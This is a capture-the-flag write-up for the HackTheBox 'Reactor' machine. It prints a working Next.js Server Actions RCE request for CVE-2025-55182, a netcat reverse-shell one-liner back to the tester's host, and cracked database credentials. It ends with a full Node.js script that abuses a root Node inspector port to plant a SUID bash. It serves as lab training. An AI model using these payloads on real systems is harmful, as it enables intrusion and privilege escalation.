---
title: "Reactor @ HackTheBox"
date: 2026-06-11
categories: [HackTheBox, Easy]
tags: [nextjs, cve-2025-55182, node-inspector]
image:
  path: /assets/react.png
---

## Enumeration

### Nmap

Standard service scan against the target.

```bash
➜ nmap 10.129.11.229 -sVC --min-rate 1000


PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
3000/tcp open  ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
|     x-nextjs-cache: HIT
|     x-nextjs-prerender: 1
|     x-nextjs-stale-time: 4294967294
|     X-Powered-By: Next.js
|     Cache-Control: s-maxage=31536000, 
|     ETag: "p02u6gnhufd8t"
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 17175
|     Date: Mon, 01 Jun 2026 02:09:42 GMT
|     Connection: close
```

Two ports open — SSH on 22 and something on 3000. The banner fingerprint 
on 3000 gave it away immediately: Next.js headers in the HTTP response, 
including `X-Powered-By: Next.js`.

## HTTP (3000)

![image description](/assets/image%20(20).png)

Wappalyzer flagged an outdated Next.js version, which pointed me straight 
to **CVE-2025-55182** — a Server-Side Request Forgery / RCE chain affecting 
vulnerable Next.js versions via malformed Server Actions.

I grabbed the scanner from Assetnote to confirm exploitability.

```bash                                 
~> /htb/reactor/react2shell-scanner python3 scanner.py -u http://10.129.11.229:3000/

brought to you by assetnote

[*] Loaded 1 host(s) to scan
[*] Using 10 thread(s)
[*] Timeout: 10s
[*] Using RCE PoC check
[!] SSL verification disabled

[VULNERABLE] http://10.129.11.229:3000/ - Status: 303

============================================================
SCAN SUMMARY
============================================================
  Total hosts scanned: 1
  Vulnerable: 1
  Not vulnerable: 0
  Errors: 0
============================================================
```

Confirmed vulnerable.

---

## Foothold — Shell as node

### RCE via CVE-2025-55182

The vulnerability abuses Next.js Server Actions through a prototype pollution 
chain in the React Flight protocol. I crafted the payload in Burp's Repeater.
The key is the `_prefix` field, which gets evaluated as JavaScript on the 
server side.
```
POST / HTTP/1.1
Host: 10.129.11.229:3000
Next-Action: x
X-Nextjs-Request-Id: b5dce965
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad
X-Nextjs-Html-Request-Id: SSTMXm7OJ_g0Ncx6jpQt9
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="0"
{
"then": "$1:proto:then",
"status": "resolved_model",
"reason": -1,
"value": "{"then":"$B1337"}",
"_response": {
"_prefix": "var res=process.mainModule.require('child_process').execSync('ls',{'timeout':5000}).toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'), {digest:${res}});",
"_chunks": "$Q2",
"_formData": {
"get": "$1:constructor:constructor"
}
}
}
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="1"
"$@0"
------WebKitFormBoundaryx8jO2oVc6SWP3Sad
Content-Disposition: form-data; name="2"
[]
------WebKitFormBoundaryx8jO2oVc6SWP3Sad--
```

![image description](/assets/image%20(21).png)

RCE confirmed. I swapped `ls` for a reverse shell payload and caught it on 
my listener.

```bash
# Payload (URL-encoded in the _prefix field)
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.15.251 1337 >/tmp/f
```

![image description](/assets/image%20(22).png)

### Database Credentials

Looking around the app directory I found a SQLite database.

```bash
node@reactor:/opt/reactor-app$ sqlite3 reactor.db
sqlite> select * from users;
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

Two MD5 hashes. I took both to Crackstation. The admin hash didn't crack, 
but `engineer` did.

![image description](/assets/image%20(23).png)

**engineer : reactor1**

---

## Lateral Movement — Shell as engineer

```bash
~> /htb/reactor ssh engineer@10.129.11.229                         
The authenticity of host '10.129.11.229 (10.129.11.229)' can't be established.
ED25519 key fingerprint is: SHA256:9v9mCPC4gn2EN/IbKKwhV8KZoNVTsVPorFhlTkNByPM
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.11.229' (ED25519) to the list of known hosts.
engineer@10.129.11.229's password: 
 ____  _____    _    ____ _____ ___  ____  
|  _ \| ____|  / \  / ___|_   _/ _ \|  _ \ 
| |_) |  _|   / _ \| |     | || | | | |_) |
|  _ <| |___ / ___ \ |___  | || |_| |  _ < 
|_| \_\_____/_/   \_\____| |_| \___/|_| \_\

    ReactorWatch Core Monitoring System
    Nuclear Dynamics Corp. - Site 7
    
    AUTHORIZED PERSONNEL ONLY
Last login: Mon Jun 1 09:57:14 2026 from 10.10.15.251
engineer@reactor:~$ cat user.txt 
8758cec02fbe8d57f897af9e271a892f
```

---

## Privilege Escalation — root via Node.js Inspector

### Discovering the Debug Port

Running `ss -tulnp` showed an internal service bound to `127.0.0.1:9229`. 
Cross-referencing with `ps aux` revealed the process behind it.

```bash
engineer@reactor:~$ ps aux | grep node
root  1388  /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

A Node.js process running as **root** with `--inspect` enabled. The 
`--inspect` flag activates the **Chrome DevTools Protocol (CDP)** debugger. 
It's bound to localhost so it's not directly reachable from the outside, but 
from our foothold as `engineer` we can reach it just fine.

### Querying the Debug Endpoint

CDP exposes a JSON endpoint that returns metadata about the running context, 
including the WebSocket path we need to connect.

```bash
engineer@reactor:~$ curl -s http://127.0.0.1:9229/json
```

### Exploitation

The CDP `Runtime.evaluate` method executes arbitrary JavaScript inside the 
running process — which here means arbitrary code as root. There was no `ws` 
npm package available, so I implemented a raw WebSocket handshake from scratch 
using Node's built-in `net` and `crypto` modules.

One thing worth noting: the inspector context doesn't expose `require` 
directly. The trick is accessing it via `process.mainModule.require`, which 
reaches into the module system of the already-running process.

I wrote the exploit to `/tmp/exploit.js` on the target:

```javascript
const net = require('net');
const crypto = require('crypto');

const key = crypto.randomBytes(16).toString('base64');
const host = '127.0.0.1';
const port = 9229;
const wsPath = '/968de5f0-7785-4556-bbec-711178ebc9f4'; // from /json endpoint

const client = net.createConnection(port, host, () => {
  const upgrade = [
    'GET ' + wsPath + ' HTTP/1.1',
    'Host: ' + host + ':' + port,
    'Upgrade: websocket',
    'Connection: Upgrade',
    'Sec-WebSocket-Key: ' + key,
    'Sec-WebSocket-Version: 13',
    '', ''
  ].join('\r\n');
  client.write(upgrade);
});

let upgraded = false;

function sendFrame(client, payload) {
  const plen = Buffer.byteLength(payload);
  const mask = crypto.randomBytes(4);
  let frame;
  if (plen < 126) {
    frame = Buffer.alloc(6 + plen);
    frame[0] = 0x81;
    frame[1] = 0x80 | plen;
    mask.copy(frame, 2);
    for (let i = 0; i < plen; i++)
      frame[6 + i] = payload.charCodeAt(i) ^ mask[i % 4];
  } else {
    frame = Buffer.alloc(8 + plen);
    frame[0] = 0x81;
    frame[1] = 0x80 | 126;
    frame.writeUInt16BE(plen, 2);
    mask.copy(frame, 4);
    for (let i = 0; i < plen; i++)
      frame[8 + i] = payload.charCodeAt(i) ^ mask[i % 4];
  }
  client.write(frame);
}

client.on('data', (chunk) => {
  const s = chunk.toString();
  console.log('RAW:', s.substring(0, 300));

  if (!upgraded && s.includes('101')) {
    upgraded = true;
    console.log('Upgraded! Sending payload...');

    const payload = JSON.stringify({
      id: 1,
      method: 'Runtime.evaluate',
      params: {
        expression: "process.mainModule.require('child_process')" +
          ".execSync('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash')" +
          ".toString()"
      }
    });

    sendFrame(client, payload);
    setTimeout(() => { client.destroy(); }, 2000);
  }
});

client.on('error', (e) => console.error('Error:', e.message));
```

The payload executed as root:
```bash
engineer@reactor:~$ node /tmp/exploit.js
RAW: HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: dxfbOUbgWFUejxScNpJhGBr6c5E=

Upgraded! Sending payload...
RAW: {"id":1,"result":{"result":{"type":"string","value":""}}}
```


The payload ran as root, copying bash with the SUID bit set. Then I just needed to run `bash -p` with the file.

```bash
engineer@reactor:~$ /tmp/rootbash -p
rootbash-5.2# whoami
root
rootbash-5.2# cat /root/root.txt
6f40fd2c2f7a728b9ee2ae25e822b2b4
```
